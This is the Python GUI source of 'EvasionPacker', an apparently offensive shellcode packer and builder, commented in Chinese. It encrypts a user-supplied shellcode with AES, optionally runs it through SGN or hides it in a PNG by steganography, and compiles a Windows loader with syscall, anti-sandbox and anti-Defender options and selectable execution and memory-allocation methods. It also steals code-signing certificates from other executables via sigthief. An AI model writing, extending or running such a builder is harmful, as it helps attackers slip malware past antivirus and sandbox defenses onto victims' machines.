import os
import sys
import struct
import secrets

# TODO 记得将Debug改为Release

from configManager import ConfigManager
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                           QHBoxLayout, QLabel, QComboBox, QCheckBox, 
                           QPushButton, QGroupBox, QFileDialog, QMessageBox,
                           QLineEdit)
from PyQt5.QtCore import QThread, pyqtSignal,Qt

class CompileThread(QThread):
    finished = pyqtSignal(bool, str)  

    def __init__(self, sln_path):
        super().__init__()
        self.sln_path = sln_path

    def run(self):
        try:
            import subprocess
            subprocess.run(["devenv.com", self.sln_path, "/Rebuild"], 
                         check=True, 
                         capture_output=True,
                         shell=True)
            self.finished.emit(True, "")
        except subprocess.CalledProcessError as e:
            self.finished.emit(False, f"编译失败: {e.stderr.decode('gbk', errors='ignore')}")
        except FileNotFoundError as e:
            self.finished.emit(False, f"找不到devenv.com，请确保Visual Studio已安装并添加到环境变量中")
        except Exception as e:
            self.finished.emit(False, str(e))

class ShellcodeThread(QThread):
    finished = pyqtSignal(bool, str, bytes) 

    def __init__(self, config_manager, settings):
        super().__init__()
        self.config_manager = config_manager
        self.settings = settings

    def run(self):
        try:
            encrypted_data = self.config_manager.encrypt_shellcode(self.settings['encrypt_method'])
            self.finished.emit(True, "", encrypted_data)
        except Exception as e:
            self.finished.emit(False, str(e), b"")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("EvasionPacker")
        self.config_manager = ConfigManager()
        self.compile_thread = None
        self.processing_label = None
        self.generate_btn = None  # 添加生成按钮的引用
        self.init_ui()
        self.setMinimumWidth(600)  # 增加最小宽度
        self.setMinimumHeight(500)  # 设置最小高度

    def show_processing_label(self, message):
        if not self.processing_label:
            # 创建半透明背景
            self.overlay = QWidget(self)
            self.overlay.setStyleSheet("background-color: rgba(0, 0, 0, 0.5);")
            self.overlay.hide()
            
            self.processing_label = QLabel(message, self.overlay)  
            self.processing_label.setStyleSheet("""
                background-color: #FFF3CD;
                color: #856404;
                padding: 20px;
                border: 1px solid #FFE69C;
                border-radius: 4px;
                font-size: 13pt;
                font-weight: bold;
            """)
            self.processing_label.setFixedSize(450, 80)
            self.processing_label.setAlignment(Qt.AlignCenter)
            self.processing_label.setWordWrap(True)  
        else:
            self.processing_label.setText(message)
        
        self.overlay.resize(self.size())
        self.overlay.show()
        
        x = (self.overlay.width() - self.processing_label.width()) // 2
        y = (self.overlay.height() - self.processing_label.height()) // 2
        self.processing_label.move(x, y)
        
        # 禁用所有控件
        self.setEnabled(False)
        self.overlay.setEnabled(True)
        self.processing_label.setEnabled(True)
    def hide_processing_label(self):
        if hasattr(self, 'overlay'):
            self.overlay.hide()
        # 恢复所有控件
        self.setEnabled(True)
    def browse_file(self):
        file_name, _ = QFileDialog.getOpenFileName(
            self, "选择Shellcode文件", "", "所有文件 (*.*)")
        if file_name:
            self.file_path.setText(file_name)
    def browse_sign_file(self):
        file_name, _ = QFileDialog.getOpenFileName(
            self, "选择签名文件", "", "可执行文件 (*.exe *.dll);;所有文件 (*.*)")
        if file_name:
            self.sign_path.setText(file_name)
    def browse_output_file(self):
        file_name, _ = QFileDialog.getSaveFileName(
            self, "选择输出位置", "", "可执行文件 (*.exe);;所有文件 (*.*)")
        if file_name:
            self.output_path.setText(file_name)
    def resizeEvent(self, event):
        super().resizeEvent(event)
        # 窗口大小改变时，调整遮罩层和标签位置
        if hasattr(self, 'overlay') and self.overlay.isVisible():
            self.overlay.resize(self.size())
            x = (self.overlay.width() - self.processing_label.width()) // 2
            y = (self.overlay.height() - self.processing_label.height()) // 2
            self.processing_label.move(x, y)
    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        # 加密设置组
        encryption_group = QGroupBox("Shellcode加密设置")
        encryption_layout = QVBoxLayout()
        
        # 添加SGN选项
        self.sgn_check = QCheckBox("启用SGN预处理shellcode")
        encryption_layout.addWidget(self.sgn_check)
        # 加密方式选择
        enc_method_layout = QHBoxLayout()
        enc_method_label = QLabel("加密方式:")
        self.encryption_combo = QComboBox()
        self.encryption_combo.addItems(self.config_manager.encryption_methods)  # 使用新的加密方法列表
        enc_method_layout.addWidget(enc_method_label)
        enc_method_layout.addWidget(self.encryption_combo)
        encryption_layout.addLayout(enc_method_layout)
    
    
        # 文件选择
        file_layout = QHBoxLayout()
        self.file_path = QLineEdit()
        self.file_path.setReadOnly(True)
        browse_btn = QPushButton("选择Shellcode")
        browse_btn.clicked.connect(self.browse_file)
        file_layout.addWidget(self.file_path)
        file_layout.addWidget(browse_btn)
        encryption_layout.addLayout(file_layout)
        encryption_group.setLayout(encryption_layout)
        layout.addWidget(encryption_group)
        # Loader配置组
        loader_group = QGroupBox("Loader配置")
        loader_layout = QVBoxLayout()
    
        layout.addWidget(loader_group)
        # 添加签名设置组
        sign_group = QGroupBox("输出设置")
        sign_layout = QVBoxLayout()  # 改为垂直布局
        # 签名文件选择
        sign_file_layout = QHBoxLayout()
        self.sign_path = QLineEdit()
        self.sign_path.setReadOnly(True)
        self.sign_path.setPlaceholderText("选择带签名的PE文件(可选)")
        browse_sign_btn = QPushButton("选择签名文件")
        browse_sign_btn.clicked.connect(self.browse_sign_file)
        sign_file_layout.addWidget(self.sign_path)
        sign_file_layout.addWidget(browse_sign_btn)
    
        steg_layout = QHBoxLayout()
        self.steg_check = QCheckBox("启用图片隐写")
        steg_layout.addWidget(self.steg_check)  
        sign_layout.addLayout(steg_layout)
    
        # 输出文件选择
        output_file_layout = QHBoxLayout()
        self.output_path = QLineEdit()
        self.output_path.setReadOnly(True)
        self.output_path.setPlaceholderText("选择最终输出位置(可选)")
        browse_output_btn = QPushButton("选择输出位置")
        browse_output_btn.clicked.connect(self.browse_output_file)
        output_file_layout.addWidget(self.output_path)
        output_file_layout.addWidget(browse_output_btn)
        
        sign_layout.addLayout(sign_file_layout)
        sign_layout.addLayout(output_file_layout)
        sign_group.setLayout(sign_layout)
        layout.addWidget(sign_group)
        # 添加提示标签
        tip_label = QLabel("反沙箱请基于目标环境按需勾选，以免上不了线")
        tip_label.setStyleSheet("""
            QLabel {
                color: #856404;
                background-color: #fff3cd;
                padding: 8px;
                border: 1px solid #ffeeba;
                border-radius: 4px;
                margin-bottom: 10px;
            }
        """)
        loader_layout.addWidget(tip_label)
        
        # 基本选项
        self.syscall_check = QCheckBox("启用 Syscall")
        self.anti_vm_check = QCheckBox("启用 基本沙箱检测")
        self.anti_defender_check = QCheckBox("反沙箱-WindowsDefender专用")
        self.dll_trick_check = QCheckBox("反沙箱-DllGetClassObject")
        self.sx_trick_check = QCheckBox("反沙箱-SxInDll")
        self.vxqq_check = QCheckBox("反沙箱-基于微信QQ")  # 添加新选项
        loader_layout.addWidget(self.syscall_check)
        loader_layout.addWidget(self.anti_vm_check)
        loader_layout.addWidget(self.anti_defender_check)
        loader_layout.addWidget(self.dll_trick_check)
        loader_layout.addWidget(self.sx_trick_check)
        loader_layout.addWidget(self.vxqq_check) 
    
        self.dll_trick_check.setChecked(True)
        self.syscall_check.setChecked(True)
        self.sx_trick_check.setChecked(True)
        # 执行方法
        exec_layout = QHBoxLayout()
        exec_label = QLabel("执行方法:")
        self.exec_combo = QComboBox()
        self.exec_combo.addItems(self.config_manager.execution_methods)
        self.exec_combo.currentTextChanged.connect(self.on_exec_method_changed)
        exec_layout.addWidget(exec_label)
        exec_layout.addWidget(self.exec_combo)
        loader_layout.addLayout(exec_layout)
        # 回调触发方法
        enum_layout = QHBoxLayout()
        enum_label = QLabel("回调触发方法:")
        self.enum_combo = QComboBox()
        self.enum_combo.addItems(self.config_manager.enum_methods)
        self.enum_combo.setEnabled(False)  # 默认禁用
        enum_layout.addWidget(enum_label)
        enum_layout.addWidget(self.enum_combo)
        loader_layout.addLayout(enum_layout)
        # 内存分配方法
        alloc_layout = QHBoxLayout()
        alloc_label = QLabel("内存分配方法:")
        self.alloc_combo = QComboBox()
        self.alloc_combo.addItems(self.config_manager.allocate_methods)
        alloc_layout.addWidget(alloc_label)
        alloc_layout.addWidget(self.alloc_combo)
        loader_layout.addLayout(alloc_layout)
        loader_group.setLayout(loader_layout)
        layout.addWidget(loader_group)
        # 生成按钮
        self.generate_btn = QPushButton("生成")  # 使用类成员变量
        self.generate_btn.setFixedHeight(35)  # 设置按钮高度
        self.generate_btn.setStyleSheet("""
            QPushButton {
                background-color: #007bff;
                color: white;
                border: none;
                padding: 5px 15px;
                border-radius: 4px;
                font-size: 12pt;
            }
            QPushButton:hover {
                background-color: #0056b3;
            }
            QPushButton:disabled {
                background-color: #cccccc;
            }
        """)
        self.generate_btn.clicked.connect(self.generate)
        layout.addWidget(self.generate_btn)
        # 为所有的QComboBox设置统一的样式
        combo_style = """
            QComboBox {
                padding: 5px;
                min-width: 200px;
            }
        """
        for combo in [self.encryption_combo, self.exec_combo, self.enum_combo, self.alloc_combo]:
            combo.setStyleSheet(combo_style)
        # 为所有的QCheckBox设置统一的样式和间距
        for check in [self.syscall_check, self.anti_vm_check, self.anti_defender_check, 
                     self.dll_trick_check, self.sx_trick_check, self.vxqq_check, self.sgn_check]:
            check.setStyleSheet("QCheckBox { padding: 5px; }")
    def browse_steg_file(self):
        file_name, _ = QFileDialog.getOpenFileName(
            self, "选择PNG图片", "", "PNG图片 (*.png);;所有文件 (*.*)")
        if file_name:
            self.steg_path.setText(file_name)
    def on_compile_finished(self, success, error_msg):
        if success:
            try:
                current_dir = os.path.dirname(os.path.abspath(__file__))
                input_path = os.path.join(current_dir, "..", "Loader", "x64", "Debug", "EvasionPacker.exe")
                
                # 处理签名和输出
                if self.sign_path.text():
                    sys.path.append(os.path.join(current_dir, "tools"))
                    from sigthief import copyCert, writeCert
                    
                    temp_signed = os.path.join(current_dir, "..", "Loader", "x64", "Debug", "EvasionPacker_signed.exe")
                    cert = copyCert(self.sign_path.text())
                    writeCert(cert, input_path, temp_signed)
                    
                    os.remove(input_path)
                    os.rename(temp_signed, input_path)
                
                if self.output_path.text():
                    import shutil
                    if os.path.exists(self.output_path.text()):
                        os.remove(self.output_path.text())
                    shutil.move(input_path, self.output_path.text())
                    QMessageBox.information(self, "成功", "文件生成完成" + 
                        ("，并已完成签名窃取" if self.sign_path.text() else ""))
                else:
                    # 如果没有指定输出路径，显示默认生成位置
                    QMessageBox.information(self, "成功", f"文件已生成到：{input_path}" + 
                        ("，并已完成签名窃取" if self.sign_path.text() else ""))
                        
            except Exception as e:
                QMessageBox.warning(self, "警告", f"后处理失败：{str(e)}\n但编译已成功完成")
        else:
            QMessageBox.critical(self, "错误", f"生成失败：{error_msg}")
        
        self.hide_processing_label()

    def on_shellcode_finished(self, success, error_msg, encrypted_data):
        if not success:
            self.hide_processing_label()
            QMessageBox.critical(self, "错误", f"Shellcode处理失败：{error_msg}")
            return

        try:
            current_dir = os.path.dirname(os.path.abspath(__file__))
            
            if self.steg_check.isChecked():
                # 1. 先写入key到header（key在加密过程中已经设置）
                # 2. 隐写加密后的shellcode到图片
                steg_output = os.path.splitext(self.output_path.text())[0] + '_steg.png' if self.output_path.text() \
                    else os.path.join(current_dir, "..", "Loader", "shellcode_steg.png")
                
                # 写入key和shellcode大小到header
                self.config_manager.save_to_header_placeholder(len(encrypted_data))
                
                # 隐写加密后的shellcode
                self.config_manager.steg_shellcode_to_image(
                    encrypted_data,
                    steg_output
                )
                QMessageBox.information(self, "提示", f"隐写图片已生成到：{steg_output}")
            else:
                # 不使用隐写，正常写入key和shellcode
                self.config_manager.save_to_header(encrypted_data)
            
            # 更新配置文件
            settings = self.config_manager.get_settings_from_ui(self)
            self.config_manager.update_config(settings)

            # 开始编译
            sln_path = os.path.normpath(os.path.join(current_dir, "..", "Loader", "EvasionPacker.sln"))
            self.compile_thread = CompileThread(sln_path)
            self.compile_thread.finished.connect(self.on_compile_finished)
            self.compile_thread.start()
            self.show_processing_label("正在编译中，请稍候（预计需要1分钟）...")
            
        except Exception as e:
            self.hide_processing_label()
            QMessageBox.critical(self, "错误", f"生成失败：{str(e)}")

    def generate(self):
        if not self.file_path.text():
            QMessageBox.warning(self, "警告", "请先选择Shellcode文件")
            return
        settings = self.config_manager.get_settings_from_ui(self)
        
        try:
            # 处理shellcode
            self.config_manager.shellcode_path = self.file_path.text()
            self.config_manager.sgn_enabled = self.sgn_check.isChecked()
            
            # 启动shellcode处理线程
            self.shellcode_thread = ShellcodeThread(self.config_manager, settings)
            self.shellcode_thread.finished.connect(self.on_shellcode_finished)
            self.shellcode_thread.start()
            
            # 显示处理提示
            message = "正在处理Shellcode"
            if self.sgn_check.isChecked():
                message += "（使用SGN预处理，预计需要30秒）"
            message += "..."
            self.show_processing_label(message)
            
        except Exception as e:
            QMessageBox.critical(self, "错误", f"生成失败：{str(e)}")
            print(f"Error: {e}")
    def on_exec_method_changed(self, text):
        self.enum_combo.setEnabled(text == "EnumCallback")

def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()